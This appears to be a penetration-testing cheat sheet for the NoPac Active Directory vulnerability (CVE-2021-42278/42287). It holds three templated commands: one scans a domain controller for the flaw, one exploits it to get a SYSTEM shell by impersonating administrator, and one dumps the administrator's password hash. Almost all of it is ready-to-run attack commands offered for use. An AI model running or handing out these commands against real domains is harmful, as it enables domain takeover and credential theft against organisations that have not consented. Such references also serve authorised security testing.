# Nopac

## NoPac

### NoPac scan

Scan scan with Nopac.

Check whether the DC is vulnerable to CVE-2021-42278 / 42287 (sAMAccountName spoofing). Read-only scan.

```sh title:"Nopac Scan Scan"
python3 scanner.py $domain/$user:$pass -dc-ip $rhost_ip -use-ldap
```
<!-- cheat
var domain
var user
var pass
var rhost_ip
-->

### NoPac shell

Spawn shell with Nopac.

Exploit NoPac to land a SYSTEM shell on the DC by impersonating administrator.

```sh title:"Nopac Spawn Shell"
python3 nopac.py $domain/$user:$pass -dc-ip $rhost_ip -dc-host $rhost_name -shell --impersonate administrator -use-ldap
```
<!-- cheat
var domain
var user
var pass
var rhost_ip
var rhost_name
-->

### NoPac dump hashes

Dump hashes with Nopac.

Exploit NoPac and pipe straight into secretsdump to pull the administrator hash.

```sh title:"Nopac Dump Hashes"
python3 nopac.py $domain/$user:$pass -dc-ip $rhost_ip -dc-host $rhost_name --dump-hashes -use-ldap --impersonate administrator -use-ldap -dump -just-dc-user $domain/administrator
```
<!-- cheat
var domain
var user
var pass
var rhost_ip
var rhost_name
-->

